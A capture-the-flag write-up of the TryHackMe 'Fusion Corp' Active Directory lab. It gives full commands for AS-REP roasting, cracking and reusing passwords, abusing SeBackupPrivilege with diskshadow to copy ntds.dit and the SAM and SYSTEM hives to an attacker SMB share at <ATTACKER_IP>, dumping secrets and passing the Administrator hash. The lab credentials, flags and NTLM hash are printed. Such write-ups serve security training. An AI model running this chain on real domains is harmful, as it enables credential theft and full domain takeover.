### 📄 THM: [Machine Name: Fusion Corp]

**Challenge Details**

- **Category:** [[CyberSecurity]], [[Active Directory]], [[AS-REP Roasting]], [[NTDS Dumping]]
    
- **Difficulty:** Hard
    
- **Target:** Fusion Corp (IP: 10.201.121.13)
    
- **Status:** #solved
    
- **Date Completed:** [[2025-11-14]]
    

---

### 🎯 Objective

This write-up documents the methodology used to compromise the `Fusion Corp` Active Directory environment. The attack path involved web enumeration to find a user list, using **AS-REP Roasting** to gain initial user credentials, performing **LDAP enumeration** to find a second, higher-privileged user, and finally exploiting the **SeBackupPrivilege** using **Volume Shadow Copy (VSS)** to dump the NTDS.DIT file and compromise the Domain Controller.

---

### 🕵️ Reconnaissance & Initial Access

The initial phase focused on enumerating the target to identify web directories, the domain structure, and potential users.

#### Port Scan & Web Enumeration

I performed a thorough Nmap scan to identify all services and a Gobuster scan to find web content.

Bash

```
# Comprehensive Nmap Scans
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt
nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt
nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt

# Directory Bruteforcing
gobuster dir -u http://$target -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,asp,xml,html,js,sql,gz,zip -r -o gb_files.txt
```

The Gobuster scan revealed an interesting directory: **`$target/backup`**. Inside this directory, the file **`emloyees.ods`** was found, which contained a list of potential employee usernames.

**Extracted User List:** `jmickel, aarnold, llinda, jpowel, dvroslav, tjefferson, nmaurin, mladovic, lparker, kgarland, dpertersen`

#### Kerberoasting (AS-REP Roasting)

I used the extracted user list with **Kerbrute** to perform username enumeration and identify accounts where the **'Do not require Kerberos preauthentication'** flag was set.

Bash

```
# Kerbrute User Enumeration (also performs AS-REP pre-check)
./kerbrute userenum users --dc $target -d fusion.corp
```

**Results:** The user **`lparker`** was identified as vulnerable to AS-REP roasting.

I extracted the hash using `impacket-GetNPUsers` and cracked it with John the Ripper.

Bash

```
# Extract the hash (impacket)
impacket-GetNPUsers fusion.corp/ -dc-ip $target -usersfile users -outputfile has

# Crack the hash (John the Ripper)
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked Password: !!abbylvzsvs2k6!
```

The initial credentials were **`lparker:!!abbylvzsvs2k6!`**.

### Initial Foothold & User Flag

I used the cracked credentials to log in via WinRM and obtained the first user flag.

Bash

```
evil-winrm -u lparker -p '!!abbylvzsvs2k6!' -i $target
```

PowerShell

```
*Evil-WinRM* PS C:\Users\lparker\desktop> type flag.txt
THM{c105b6fb249741b89432fada8218f4ef}
```

#### LDAP Enumeration & Second User

Using the valid `lparker` credentials, I performed an authenticated LDAP query with `netexec` to enumerate additional domain users and attributes.

Bash

```
netexec ldap $target -u 'lparker' -p '!!abbylvzsvs2k6!' --users
```

**Results:** This query successfully retrieved details for other users, including a description field that contained a password for the user **`jmurphy`**.

**Second User Credentials:** **`jmurphy:u8WC3!kLsgw=#bRY`**

I logged in as `jmurphy` and retrieved a second flag.

Bash

```
evil-winrm -u jmurphy -p 'u8WC3!kLsgw=#bRY' -i $target
```

PowerShell

```
*Evil-WinRM* PS C:\Users\jmurphy\desktop> type flag.txt
THM{b4aee2db2901514e28db4242e047612e}
```

### 🪜 Privilege Escalation (Dumping NTDS.DIT)

Further enumeration of the `jmurphy` account revealed they were a member of the **Backup Operators** group, which grants the powerful **`SeBackupPrivilege`** and **`SeRestorePrivilege`**. This can be leveraged to read the entire filesystem, including the restricted **NTDS.DIT** file.

#### Exploiting SeBackupPrivilege with Diskshadow (VSS)

I used **Diskshadow** to create a Volume Shadow Copy of the C: drive, which allows the NTDS.DIT file to be copied while the domain controller is running.

**1. Create Diskshadow Script (viper.dsh):** This file was created on the attack machine and later uploaded.

Plaintext

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

**2. Setup SMB Share on Attack Box:** This share was used to transfer the script and exfiltrate the sensitive files.

Bash

```
sudo impacket-smbserver share ./ -smb2support -user test -pass ''
```

**3. Execution on Target (jmurphy shell):**

- **Map the SMB Share:**
    
    PowerShell
    
    ```
    *Evil-WinRM* PS C:\Windows\tasks> net use \\<ATTACKER_IP>\share /user:test
    ```
    
- **Run Diskshadow:**
    
    PowerShell
    
    ```
    *Evil-WinRM* PS C:\Windows\tasks> diskshadow /s viper.dsh
    ```
    
- **Copy NTDS.DIT:** The Volume Shadow Copy is mounted as drive `X:`. The `/b` flag enables backup mode, leveraging the `SeBackupPrivilege`.
    
    PowerShell
    
    ```
    *Evil-WinRM* PS C:\Windows\tasks> robocopy /b x:\windows\ntds . ntds.dit
    ```
    
- **Save SAM and SYSTEM Registry Hives:** These are needed along with `ntds.dit` to decrypt the password hashes.
    
    PowerShell
    
    ```
    *Evil-WinRM* PS C:\Windows\tasks> reg save hklm\system c:\windows\tasks\system
    *Evil-WinRM* PS C:\Windows\tasks> reg save hklm\sam c:\windows\tasks\sam
    ```
    
- **Exfiltrate Files:**
    
    PowerShell
    
    ```
    *Evil-WinRM* PS C:\Windows\tasks> copy sam, system, ntds.dit \\<ATTACKER_IP>\share\
    ```
    

**4. Dump Secrets on Attack Box:**

Bash

```
impacket-secretsdump -ntds ntds.dit -system system -sam sam local
```

**Results:** The hashes for all domain users, including the **Administrator (RID 500)**, were successfully dumped.

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
# Administrator Hash: 9653b02d945329c7270525c4c2a69c67
```

#### Final SYSTEM Compromise

With the Administrator NTLM hash, I performed a **Pass-the-Hash** attack to gain a SYSTEM-level shell on the Domain Controller.

Bash

```
# Authenticate Administrator hash with netexec
netexec smb $target -u Administrator -H 9653b02d945329c7270525c4c2a69c67

# Get a shell with wmiexec
impacket-wmiexec fusion.corp/Administrator@$target -hashes :9653b02d945329c7270525c4c2a69c67
```

The final flag was then retrieved from the Administrator's desktop.

PowerShell

```
C:\users\administrator\desktop>type flag.txt
THM{f72988e57bfc1deeebf2115e10464d15}
```

## 🧠 Lessons Learned: THM Fusion Corp

### 1. Web Reconnaissance is Crucial for Initial AD Intel 🌐

The most common entry point to an internal network is often the web. In this case, basic web enumeration, specifically directory brute-forcing, led directly to a major piece of intelligence: the **`emloyees.ods`** file in the hidden `/backup` directory.

- **Key takeaway:** Never underestimate the value of simple web directory enumeration, even against a target that appears to be a pure Active Directory machine. Exposed files can contain user lists, configuration data, or even plaintext credentials.
    

---

### 2. AS-REP Roasting for Initial Access 🔑

The employee list provided the username dictionary needed to launch an **AS-REP Roasting** attack, which was the first successful access vector.

- **Key takeaway:** Attack the weakest link first. The presence of the **"Do not require Kerberos preauthentication"** flag on the `lparker` account allowed for the offline cracking of a Kerberos hash. Tools like `kerbrute` and `impacket-GetNPUsers` are essential for quickly identifying and exploiting these misconfigurations.
    

---

### 3. Deep LDAP Enumeration with Authenticated Access 📝

Once you gain a single user's credentials (`lparker`), you must pivot to authenticated enumeration. The `lparker` account, though low-privileged, was enough to query the LDAP service and find the next set of credentials.

- **Key takeaway:** Use tools like `netexec` (with the `--users` flag) to perform authenticated **LDAP/SMB enumeration**. Active Directory often stores sensitive information (like passwords) in user description fields or other less-obvious attributes, as was the case with the `jmurphy` user.
    

---

### 4. Exploiting the `SeBackupPrivilege` for Domain Compromise 💾

The most critical privilege escalation was exploiting the **`SeBackupPrivilege`** held by the **`jmurphy`** user (due to their membership in the **Backup Operators** group). This privilege allows a user to bypass normal file permissions for the purpose of backup.

- **Key takeaway:** The `SeBackupPrivilege` is equivalent to a full domain compromise on a Domain Controller. When this is found, the attacker can leverage the **Volume Shadow Copy Service (VSS)** with tools like **`diskshadow`** and **`robocopy /b`** to safely copy the protected **NTDS.DIT**, **SAM**, and **SYSTEM** files without crashing the DC.
    

---

### 5. Finalizing with Pass-the-Hash 🛡️

After successfully dumping the Administrator's NTLM hash (`9653b02d945329c7270525c4c2a69c67`), the final step was a **Pass-the-Hash** attack.

- **Key takeaway:** Once the Domain Administrator's hash is obtained, credentials are no longer needed. Tools like `impacket-wmiexec` or `impacket-psexec` allow for immediate SYSTEM-level access to the Domain Controller, completing the full compromise.
